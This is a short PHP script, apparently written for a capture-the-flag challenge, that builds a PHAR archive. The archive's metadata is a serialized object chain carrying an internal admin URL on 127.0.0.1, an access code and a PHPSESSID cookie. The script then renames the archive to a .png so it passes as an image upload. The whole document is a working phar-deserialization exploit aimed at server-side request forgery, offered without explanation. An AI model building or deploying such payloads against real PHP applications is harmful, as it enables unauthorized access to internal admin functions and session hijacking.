<?php
class PreviewState {
    public $endpoint;
    private $headers;
    private $payload;
    private $sessionNote;

    public function __construct($endpoint, $payload, $sessionNote, $headers) {
        $this->endpoint = $endpoint;
        $this->payload = $payload;
        $this->sessionNote = $sessionNote;
        $this->headers = $headers;
    }
}

class PendingPreview {
    public $state;
    public function __construct($state) {
        $this->state = $state;
    }
}

$state = new PreviewState('http://127.0.0.1/admin.php', 'access_code=ARCHIVE-5B06D2FB6A589B23', 'PHPSESSID=5ebb898264dcafdeebc919ea2c316411', []);
$obj = new PendingPreview($state);

$phar = new Phar('ssrf1.phar');
$phar->startBuffering();
$phar->addFromString('test.png', 'test');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($obj);
$phar->stopBuffering();
rename('ssrf1.phar', 'ssrf1.png');
?>